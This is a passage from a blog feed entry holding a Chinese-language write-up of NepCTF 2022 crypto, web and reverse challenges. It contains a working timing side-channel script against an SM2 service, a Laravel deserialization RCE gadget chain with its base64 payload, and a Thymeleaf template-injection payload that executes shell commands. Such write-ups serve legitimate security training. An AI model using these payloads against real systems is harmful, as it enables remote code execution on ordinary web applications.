class="literal">False</span>)</span><br><span class="line">        <span class="keyword">return</span> self._recvall()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">handle</span>(<span class="params">self</span>):</span><br><span class="line">        signal.alarm(<span class="number">3600</span>)</span><br><span class="line">        g=ecc_table[<span class="string">&quot;g&quot;</span>]</span><br><span class="line">        O=ecc_table[<span class="string">&quot;O&quot;</span>]</span><br><span class="line">        t=[randint(<span class="number">1</span>,<span class="number">254</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>)]</span><br><span class="line">        sk=<span class="built_in">sum</span>([<span class="number">1</span>&lt;&lt;i <span class="keyword">for</span> i <span class="keyword">in</span> t])</span><br><span class="line">        </span><br><span class="line">        self.send(<span class="string">&quot;system reseting...&quot;</span>)</span><br><span class="line">        sm2 = TSM2(sk)</span><br><span class="line">        self.send(<span class="string">&quot;done&quot;</span>)</span><br><span class="line">        self.send(<span class="string">&quot;the system is &quot;</span>+<span class="built_in">str</span>(sm2.pk))</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                user=<span class="built_in">int</span>(self.recv(<span class="string">&quot;plz give me your number:&quot;</span>))</span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                self.send(<span class="string">&quot;wrong, plz try again&quot;</span>)</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            t1=clock1()</span><br><span class="line">            kG=sm2.kg(sk-user,g)</span><br><span class="line">            t2=clock1()</span><br><span class="line">            self.send(<span class="string">&quot;used &quot;</span>+<span class="built_in">str</span>((t2-t1)/<span class="number">1e9</span>)+<span class="string">&quot; s&quot;</span>)</span><br><span class="line">            <span class="keyword">if</span> kG==O:</span><br><span class="line">                f=<span class="built_in">open</span>(<span class="string">&quot;/flag&quot;</span>)</span><br><span class="line">                flag=f.read()</span><br><span class="line">                self.send(flag)</span><br><span class="line">                exit()</span><br><span class="line">            </span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ThreadedServer</span>(socketserver.ThreadingMixIn, socketserver.TCPServer):</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ForkedServer</span>(socketserver.ForkingMixIn, socketserver.TCPServer):</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    HOST, PORT = <span class="string">&#x27;0.0.0.0&#x27;</span>,<span class="number">8000</span></span><br><span class="line">    server = ForkedServer((HOST, PORT), Task)</span><br><span class="line">    server.allow_reuse_address = <span class="literal">True</span></span><br><span class="line">    <span class="built_in">print</span>(HOST, PORT)</span><br><span class="line">    server.serve_forever()</span><br></pre></td></tr></table></figure></blockquote><p><code>TSM2</code> 类为正常SM2算法实现，只不过在加法运算 <code>_add_point()</code> 和倍乘运算 <code>_double_point()</code> 分别加了 <code>sleep()</code> 控制运算时间。</p><p><code>handle()</code> 处理函数里，给出公钥 $pk$，给100次要求输入 $u$，当满足 $(sk-u)G=O$ 时可拿flag。</p><p>要满足 $(sk-u)G=O$，只有 $sk-u=0$ 或 $sk-u=n$，由于除了公钥和运算总时间无其他输出，只能猜测出 $u=sk$。</p><p>由于 $sk$ 只有8位为1，利用运算总时间，可作为侧信道信息来测试 $sk$ 各位为1时的消耗时间，测试发现当接近正确的“1”位时，运算总时间相较相邻的两位小，那么可使用时间侧信道攻击来求解私钥 $sk$。</p><p>因尝试的总次数最多为100次，采用区间遍历法缩小尝试次数，令 $x$ 为每个区间长度，总次数 $c=\cfrac{254}{x}+8x \le 100$，$x$ 可取值4~8。</p><p>采用 $x=4$ 实现：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">r=remote(<span class="string">&#x27;nep.lemonprefect.cn&#x27;</span>,<span class="number">31135</span>)</span><br><span class="line">r.recvuntil(<span class="string">&#x27;is &#x27;</span>)</span><br><span class="line">pk=r.recvline().strip()</span><br><span class="line"><span class="built_in">print</span>(pk)</span><br><span class="line"></span><br><span class="line">nowt = <span class="number">100000.0</span></span><br><span class="line">start = []</span><br><span class="line">startt = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">send</span>(<span class="params">x</span>):</span><br><span class="line">    r.recvuntil(<span class="string">&#x27;number:&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(x))</span><br><span class="line">    r.recvuntil(<span class="string">&#x27;used &#x27;</span>)</span><br><span class="line">    time = <span class="built_in">float</span>(r.recvuntil(<span class="string">&#x27; s&#x27;</span>)[:-<span class="number">2</span>])</span><br><span class="line">    r.recvline()</span><br><span class="line">    <span class="keyword">return</span> time</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">255</span>,<span class="number">4</span>):</span><br><span class="line">    t = send(<span class="number">1</span> &lt;&lt; i)</span><br><span class="line">    <span class="built_in">print</span>(i,t)</span><br><span class="line">    <span class="keyword">if</span> t &gt; nowt:</span><br><span class="line">        start.append(i-<span class="number">4</span>)</span><br><span class="line">        <span class="built_in">print</span>(start)</span><br><span class="line">    nowt = t</span><br><span class="line">    </span><br><span class="line"><span class="built_in">print</span>(start)</span><br><span class="line"></span><br><span class="line">ans = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> start:</span><br><span class="line">    nowt = send(<span class="number">1</span> &lt;&lt; k)</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">        t = send(<span class="number">1</span> &lt;&lt; (k+<span class="number">1</span>+j))</span><br><span class="line">        <span class="keyword">if</span> t &gt; nowt <span class="keyword">and</span> k+<span class="number">1</span>+j-<span class="number">1</span> &lt;= <span class="number">254</span>:</span><br><span class="line">            ans.append(k+<span class="number">1</span>+j-<span class="number">1</span>)</span><br><span class="line">            <span class="built_in">print</span>(ans)</span><br><span class="line">        nowt = t</span><br><span class="line">            </span><br><span class="line"><span class="built_in">print</span>(ans)</span><br><span class="line"></span><br><span class="line">sk = <span class="built_in">sum</span>([<span class="number">1</span>&lt;&lt;i <span class="keyword">for</span> i <span class="keyword">in</span> ans])</span><br><span class="line"><span class="built_in">print</span>(sk)</span><br><span class="line">send(sk)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(r.recvall())</span><br></pre></td></tr></table></figure><p>​    </p><h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="Just-Kidding"><a href="#Just-Kidding" class="headerlink" title="Just Kidding"></a>Just Kidding</h3><blockquote><p>顽皮的HRP用Laravel写了个项目来欢迎大伙来玩Nepctf 2nd，没想到…居然被坏蛋Sharun撅了</p></blockquote><p>访问 <code>www.zip</code> 下载源码，CMS为Laravel 9.x。</p><p>在 <code>www\app\Http\Controllers</code> 发现 <code>HelloController.php</code>：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">App</span>\<span class="title class_">Http</span>\<span class="title class_">Controllers</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HelloController</span> <span class="keyword">extends</span> <span class="title">Controller</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">hello</span>(<span class="params">\Illuminate\Http\Request <span class="variable">$request</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$h3</span> = <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$request</span>-&gt;<span class="title function_ invoke__">input</span>(<span class="string">&quot;h3&quot;</span>));</span><br><span class="line">        <span class="title function_ invoke__">unserialize</span>(<span class="variable">$h3</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Welcome Nepctf! GL&amp;HF&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>反序列化RCE漏洞，使用现成链子可以打通：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Illuminate</span>\<span class="title class_">Routing</span>&#123;</span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">Illuminate</span>\<span class="title class_">Validation</span>\<span class="title class_">Validator</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">PendingResourceRegistration</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$registrar</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$registered</span> = <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$name</span>=<span class="string">&#x27;call_user_func&#x27;</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$controller</span>=<span class="string">&#x27;system&#x27;</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$options</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$cmd</span></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;registrar=<span class="keyword">new</span> <span class="title class_">Validator</span>();</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;options=<span class="variable">$cmd</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title class_">PendingResourceRegistration</span>(<span class="string">&#x27;cat /flag&#x27;</span>)));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Illuminate</span>\<span class="title class_">Validation</span>&#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">Validator</span>&#123;    </span><br><span class="line">        <span class="title class_">public</span> $<span class="title class_">extensions</span> = [];</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;extensions[<span class="string">&#x27;&#x27;</span>]=<span class="string">&#x27;call_user_func&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Payload：</p><p><code>/hello?h3=Tzo0NjoiSWxsdW1pbmF0ZVxSb3V0aW5nXFBlbmRpbmdSZXNvdXJjZVJlZ2lzdHJhdGlvbiI6NTp7czoxMjoiACoAcmVnaXN0cmFyIjtPOjMxOiJJbGx1bWluYXRlXFZhbGlkYXRpb25cVmFsaWRhdG9yIjoxOntzOjEwOiJleHRlbnNpb25zIjthOjE6e3M6MDoiIjtzOjE0OiJjYWxsX3VzZXJfZnVuYyI7fX1zOjEzOiIAKgByZWdpc3RlcmVkIjtiOjA7czo3OiIAKgBuYW1lIjtzOjE0OiJjYWxsX3VzZXJfZnVuYyI7czoxMzoiACoAY29udHJvbGxlciI7czo2OiJzeXN0ZW0iO3M6MTA6IgAqAG9wdGlvbnMiO3M6OToiY2F0IC9mbGFnIjt9</code></p><p>​    </p><h3 id="Challenger"><a href="#Challenger" class="headerlink" title="Challenger"></a>Challenger</h3><blockquote><p>顽皮的HRP又换了种语言写项目来欢迎大家，没想到又让Sharun掘了😭</p><p>（flag在根目录下: /flag）</p></blockquote><p>用jd-gui反编译 <code>challenger.jar</code> 文件，发现使用了Thymeleaf模板，</p><p>在 <code>HelloController.class</code> 里发现 <code>/eval</code> 路由：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HelloController</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">Logger</span> <span class="variable">log</span> <span class="operator">=</span> LoggerFactory.getLogger(com.veracode.research.HelloController.class);</span><br><span class="line">  </span><br><span class="line">  <span class="meta">@GetMapping(&#123;&quot;/&quot;&#125;)</span></span><br><span class="line">  <span class="keyword">public</span> String <span class="title function_">index</span><span class="params">(Model model)</span> &#123;</span><br><span class="line">    model.addAttribute(<span class="string">&quot;message&quot;</span>, <span class="string">&quot;challenger&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;welcome&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="meta">@GetMapping(&#123;&quot;/eval&quot;&#125;)</span></span><br><span class="line">  <span class="keyword">public</span> String <span class="title function_">path</span><span class="params">(<span class="meta">@RequestParam</span> String lang)</span> &#123; <span class="keyword">return</span> <span class="string">&quot;user/&quot;</span> + lang + <span class="string">&quot;/welcome&quot;</span>; &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>参考 <a href="https://www.cnblogs.com/hetianlab/p/13679645.html">Thymeleaf 模板注入导致命令执行</a>，修改payload拿到flag：</p><p>Payload:</p><p><code>/eval?lang=__$%7bnew%20java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(%22cat%20/flag%22).getInputStream()).next()%7d__::</code></p><p>​    </p><h2 id="REVERSE"><a href="#REVERSE" class="headerlink" title="REVERSE"></a>REVERSE</h2><h3 id="快来签到"><a href="#快来签到" class="headerlink" title="快来签到"></a>快来签到</h3><blockquote><p>x86 linux</p></blockquote><p>趣味题。</p><p>IDA打开发现报错 <code>The graph is too big more than 1000 nodes...</code>，且 <code>main()</code> 函数中定义多个图节点，到 IDA - Options - Graph - Max number of nodes 里改一个大数保存，回到 <code>main()</code> 函数切换成Graph overview或者IDA View中缩小，可以看到控制流图（CFG）：</p><p><img src="/2022/07/17/match-NepCTF-2022/image-20220717213910100.png" alt="image-20220717213910100"></p><p>flag：<code>NepCTF&#123;welc0me_t0_nepctf&#125;</code></p><p>​    </p><h3 id="We-can-gone"><a href="#We-can-gone" class="headerlink" title="We_can_gone"></a>We_can_gone</h3><blockquote><p>是出发的时候了!!!</p></blockquote><p>Go逆向，IDA7.7分析，在String窗口里找到关键字符串交叉引用定位入口函数 <code>sub_4994E0()</code>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">__int128 <span class="title function_">sub_4994E0</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  _BYTE *v0; <span class="comment">// [esp+0h] [ebp-18h]</span></span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// [esp+0h] [ebp-18h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v2; <span class="comment">// [esp+4h] [ebp-14h]</span></span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// [esp+4h] [ebp-14h]</span></span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// [esp+8h] [ebp-10h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v5; <span class="comment">// [esp+Ch] [ebp-Ch]</span></span><br><span class="line">  _BYTE *v6; <span class="comment">// [esp+14h] [ebp-4h]</span></span><br><span class="line">  __int128 result; <span class="comment">// [esp+1Ch] [ebp+4h]</span></span><br><span class="line"></span><br><span class="line">  sub_4993B0(); <span class="comment">// 输出字符串&quot;Welcome to NepCTF,I gone on the other side&quot;</span></span><br><span class="line">  v6 = v0;</span><br><span class="line">  v5 = v2;</span><br><span class="line">  sub_433950();</span><br><span class="line">  runtime_printstring(<span class="string">&quot;please input flag to help you get to the other side:\n&quot;</span>, <span class="number">53</span>);</span><br><span class="line">  sub_4339C0();</span><br><span class="line">  <span class="keyword">if</span> ( v5 &lt;= <span class="number">0xB</span> )</span><br><span class="line">    sub_459750(v1, v3);</span><br><span class="line">  v6[<span class="number">11</span>] = <span class="number">84</span>;</span><br><span class="line">  <span class="keyword">if</span> ( v5 &lt;= <span class="number">0xC</span> )</span><br><span class="line">    sub_459750(v1, v3);</span><br><span class="line">  v6[<span class="number">12</span>] = <span class="number">82</span>;</span><br><span class="line">  <span class="keyword">if</span> ( v5 &lt;= <span class="number">0xD</span> )</span><br><span class="line">    sub_459750(v1, v3);</span><br><span class="line">  v6[<span class="number">13</span>] = <span class="number">85</span>;</span><br><span class="line">  <span class="keyword">if</span> ( v5 &lt;= <span class="number">0xE</span> )</span><br><span class="line">    sub_459750(v1, v3);</span><br><span class="line">  v6[<span class="number">14</span>] = <span class="number">69</span>;      <span class="comment">// 定义字符串TRUE</span></span><br><span class="line">  *(_QWORD *)&amp;result = __PAIR64__(v5, (<span class="type">unsigned</span> <span class="type">int</span>)v6);   <span class="comment">// 伪代码混乱</span></span><br><span class="line">  DWORD2(result) = v4;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>后半部分伪代码不清晰，在该函数附近发现判断逻辑函数 <code>sub_499630()</code> ：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">sub_499630</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// edx</span></span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// [esp+0h] [ebp-64h]</span></span><br><span class="line">  <span class="type">int</span> *v2; <span class="comment">// [esp+4h] [ebp-60h]</span></span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// [esp+4h] [ebp-60h]</span></span><br><span class="line">  _BYTE *v4; <span class="comment">// [esp+Ch] [ebp-58h]</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// [esp+10h] [ebp-54h]</span></span><br><span class="line">  <span class="type">int</span> v6[<span class="number">8</span>]; <span class="comment">// [esp+20h] [ebp-44h] BYREF</span></span><br><span class="line">  <span class="type">int</span> *v7; <span class="comment">// [esp+40h] [ebp-24h]</span></span><br><span class="line">  <span class="type">int</span> v8[<span class="number">2</span>]; <span class="comment">// [esp+44h] [ebp-20h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v9[<span class="number">2</span>]; <span class="comment">// [esp+4Ch] [ebp-18h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v10[<span class="number">2</span>]; <span class="comment">// [esp+54h] [ebp-10h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v11[<span class="number">2</span>]; <span class="comment">// [esp+5Ch] [ebp-8h] BYREF</span></span><br><span class="line"></span><br><span class="line">  v2 = (<span class="type">int</span> *)unknown_libname_8((<span class="type">int</span>)<span class="string">&quot;\b&quot;</span>);</span><br><span class="line">  v7 = v2;</span><br><span class="line">  v2[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">  *v2 = <span class="number">0</span>;</span><br><span class="line">  v11[<span class="number">0</span>] = (<span class="type">int</span>)&amp;unk_4A00A0;</span><br><span class="line">  v11[<span class="number">1</span>] = (<span class="type">int</span>)v2;</span><br><span class="line">  fmt_Fscanln((<span class="type">int</span>)&amp;off_4D25B8, dword_54B200, (<span class="type">int</span>)v11, <span class="number">1</span>, <span class="number">1</span>);</span><br><span class="line">  v4 = (_BYTE *)sub_4479B0((<span class="type">int</span>)v6, *v7, v7[<span class="number">1</span>]);</span><br><span class="line">  <span class="keyword">if</span> ( v5 == <span class="number">23</span>                      <span class="comment">//输入字符串长度满足23</span></span><br><span class="line">    &amp;&amp; *v4 == <span class="string">&#x27;N&#x27;</span></span><br><span class="line">    &amp;&amp; v4[<span class="number">1</span>] == <span class="string">&#x27;e&#x27;</span></span><br><span class="line">    &amp;&amp; v4[<span class="number">2</span>] == <span class="string">&#x27;p&#x27;</span></span><br><span class="line">    &amp;&amp; v4[<span class="number">3</span>] == <span class="string">&#x27;C&#x27;</span></span><br><span class="line">    &amp;&amp; v4[<span class="number">4</span>] == <span class="string">&#x27;T&#x27;</span></span><br><span class="line">    &amp;&amp; v4[<span class="number">5</span>] == <span class="string">&#x27;F&#x27;</span></span><br><span class="line">    &amp;&amp; v4[<span class="number">6</span>] == <span class="string">&#x27;&#123;&#x27;</span></span><br><span class="line">    &amp;&amp; v4[<span class="number">22</span>] == <span class="string">&#x27;&#125;&#x27;</span> )               <span class="comment">//输入字符串满足前缀NepCTF&#123;，后缀满足&#125;</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="number">15</span>; ++i )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( i &gt;= (<span class="type">unsigned</span> <span class="type">int</span>)dword_54B6E4 )</span><br><span class="line">        sub_459750(v1, v3);</span><br><span class="line">      <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)(i + <span class="number">7</span>) &gt;= <span class="number">0x17</span> )</span><br><span class="line">        sub_459750(v1, v3);</span><br><span class="line">      <span class="keyword">if</span> ( v4[i + <span class="number">7</span>] != *(_BYTE *)(dword_54B6E0 + i) )     <span class="comment">//将输入和dword_54B6E0比较</span></span><br><span class="line">      &#123;</span><br><span class="line">        v9[<span class="number">0</span>] = (<span class="type">int</span>)<span class="string">&quot;\b&quot;</span>;</span><br><span class="line">        v9[<span class="number">1</span>] = (<span class="type">int</span>)&amp;off_4D2334;</span><br><span class="line">        unknown_libname_61((<span class="type">int</span>)&amp;off_4D25CC, dword_54B204, (<span class="type">int</span>)v9, <span class="number">1</span>, <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    v8[<span class="number">0</span>] = (<span class="type">int</span>)<span class="string">&quot;\b&quot;</span>;</span><br><span class="line">    v8[<span class="number">1</span>] = (<span class="type">int</span>)&amp;off_4D233C;</span><br><span class="line">    unknown_libname_61((<span class="type">int</span>)&amp;off_4D25CC, dword_54B204, (<span class="type">int</span>)v8, <span class="number">1</span>, <span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    v10[<span class="number">0</span>] = (<span class="type">int</span>)<span class="string">&quot;\b&quot;</span>;</span><br><span class="line">    v10[<span class="number">1</span>] = (<span class="type">int</span>)&amp;off_4D2334;</span><br><span class="line">    unknown_libname_61((<span class="type">int</span>)&amp;off_4D25CC, dword_54B204, (<span class="type">int</span>)v10, <span class="number">1</span>, <span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在 <code>v4[i + 7] != *(_BYTE *)(dword_54B6E0 + i)</code> 比较处下断点动调，查看 <code>dword_54B6E0</code> 存放的值为 <code>U9eT_t0_th3TRUE</code>，故flag为<code>NepCTF&#123;U9eT_t0_th3TRUE&#125;</code>。</p><p>​    </p><h2 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h2><p>菜。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;​    &lt;/p&gt;
&lt;p&gt;“NepCTF 2022”是由Nepnep联合站队主办的公益招新赛事，旨在以有代表性、有特色的题目培养新生网络安全能力。&lt;/p&gt;
&lt;p&gt;比赛时间：2022年7月15日10:00 - 2022年7月17日10:00。&lt;/p&gt;
&lt;p&gt;比赛形式：个人解题</summary>
      
    
    
    
    <category term="match" scheme="https://lazzzaro.github.io/categories/match/"/>
    
    
    <category term="2022赛" scheme="https://lazzzaro.github.io/tags/2022%E8%B5%9B/"/>
    
  </entry>
  
</feed>
